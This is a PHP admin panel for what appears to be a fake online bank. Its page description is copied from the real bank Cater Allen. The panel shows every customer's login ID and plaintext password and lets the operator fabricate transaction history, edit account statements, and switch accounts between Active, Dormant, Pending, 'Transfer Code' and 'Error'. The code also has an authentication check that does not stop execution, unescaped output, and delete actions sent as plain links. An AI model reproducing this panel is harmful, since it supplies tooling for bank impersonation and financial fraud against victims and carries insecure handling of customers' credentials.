<?php
session_start();
if ($_SESSION['admin_name'] == "" || $_SESSION['admin_password'] == "") {
    header("Location: admin_login.php");
}

include_once '../includes/dbh.inc.php';

include_once '../includes/delete_client.php';

$sql = 'SELECT * FROM reg_users';
$result = mysqli_query($conn, $sql);
$resultChecker = mysqli_num_rows($result);
?>
<!DOCTYPE html>
<html>

<head>
    <meta name="keywords" content="" />
    <meta name="description" content="Cater Allen awarded Best Financial Service Provider 2018. We have over 200 years of experience working with financial advisers and intermediaries in the UK." />
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="theme-color" content="#022151">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <title>Admin Cpanel </title>

    <!-- Latest compiled and minified CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.6.3/css/all.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet">
    <!-- Favicon -->
    <link rel="icon" type="image/png" href="../../img/icon.png" />

</head>

<body>
    <nav class="navbar navbar-expand-md navbar-light fixed">
        <a href="../index.php" class="navbar-brand"><img src="../images/logo.png" style="width: 200px; height: 64px;" alt="logo"> </a>
        <a href="admin_cpanel.php" style="color:#006eb8; text-decoration: none;">
            <i class="fas fa-home"></i>
            <span style="text-decoration: underline;">ADMIN SECTION</span>
        </a>
    </nav>
    <div class="container-fluid mt-5">
        <div class="col-12">
            <!--
                             <!-- Contact Message -->
            <center>
                <a href="contact_mail.php" target="_self" class="btn btn-primary">
                    <i class="far fa-share-square"></i>
                    VIEW CONTACT MESSAGE FROM CONTACT FORM ON YOUR WEBSITE
                </a>
                <hr>
                <br>
            </center>
            <br>
        </div>
        <a href="setting.php" class="btn btn-primary" style="float:right !important; margin-left: 10px;">
            <i class="fas fa-cogs"></i>
            Setting
        </a>
        <a href="log_out.php" class="btn btn-danger" style="float:right !important;">
            Log out
            <i class="fas fa-sign-out-alt"></i>
        </a>
        <br>
        <h3>Customer's Table</h3>
        <div class="table-responsive">
            <table class="table table-striped">
                <thead style="font-size: 12px;">
                    <tr>
                        <th scope="col">S/N</th>
                        <th scope="col">ACCOUNT NAME</th>
                        <th scope="col">LOGIN ID</th>
                        <th scope="col">PASSWORD</th>
                        <th scope="col">LAST LOGIN</th>
                        <th scope="col">ADD HISTORY</th>
                        <th scope="col">EDIT USER INFO</th>
                        <th scope="col">EDIT ACCOUNT STATEMENT</th>
                        <th scope="col">DELETE CUSTOMER</th>
                        <th scope="col">ACTIVATE ACCOUNT</th>
                        <th scope="col">ACCOUNT STATUS</th>
                    </tr>
                </thead>
                <tbody style="font-size: 12px">
                    <?php
                    if ($resultChecker > 0) {
                        $count = 1;
                        while ($rows = mysqli_fetch_assoc($result)) {
                            //                                $client_id = $rows['id'];
                    ?>
                            <tr>

                                <td><?php echo $count; ?></td>
                                <td><?php echo $rows['first_name'] . " " . $rows['last_name']; ?></td>
                                <td><?php echo $rows['bank_id']; ?></td>
                                <td><?php echo $rows['psw']; ?></td>
                                <td><?php echo $rows['last_login']; ?></td>
                                <td><a href="<?php echo "customer_profile.php?client=" . $rows['id'] ?>" class="btn btn-success"><i class="fas fa-eye" style="font-size: 12px"></i> ADD</a></td>
                                <td><a href="<?php echo "edit.php?client=" . $rows['id'] ?>" class="btn btn-primary"><i class="fas fa-eye" style="font-size: 12px"></i> EDIT</a></td>
                                <td><a href="<?php echo "choose.php?client=" . $rows['id'] ?>" class="btn btn-primary"><i class="fas fa-eye" style="font-size: 12px"></i> EDIT</a></td>
                                <td> <a href='../includes/delete_client.php?del=<?php echo $rows['id']; ?>' type='button' class='btn btn-danger' style='margin-right: 5px; background: red !important'><i class='fas fa-trash-alt'></i> Delete</a></td>
                                <td style="font-size: 10px">
                                    <button class="btn-sm btn-success" type="button" class=""><a style="color: #fff" href="complete.php?val=<?php echo $rows['id']; ?>">Active</a></button>
                                    <br>
                                    <br>
                                    <button class="btn-sm btn-danger" type="button" class=""><a style="color: #fff;" href="error.php?val=<?php echo $rows['id']; ?>">Dormant</a></button>
                                    <br><br>
                                    <button class="btn-sm btn-primary" type="button" class=""><a style="color: #fff" href="pending.php?val=<?php echo $rows['id']; ?>">Pending</a></button>
                                    <br>
                                    <br>
                                    <button class="btn-sm btn-warning" type="button" class=""><a style="color: #fff" href="transfer_code.php?val=<?php echo $rows['id']; ?>">Transfer Code</a></button>
                                    ` <br>

                                    <button class="btn-sm" type="button" style="background: #333; border-radius: 5px;"><a style="color: #fff;" href="dormant.php?val=<?php echo $rows['id']; ?>">Error</a></button>
                                    <br>

                                </td>
                                <td><?php echo $rows['trans_status']; ?></td>
                            </tr>

                    <?php

                            $count++;
                        }
                    }
                    ?>
                </tbody>
            </table>
        </div>

    </div>



    <!-- jQuery library -->
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>

    <!-- Popper JS -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.7/umd/popper.min.js"></script>

    <!-- Latest compiled JavaScript -->
    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>
</body>

</html>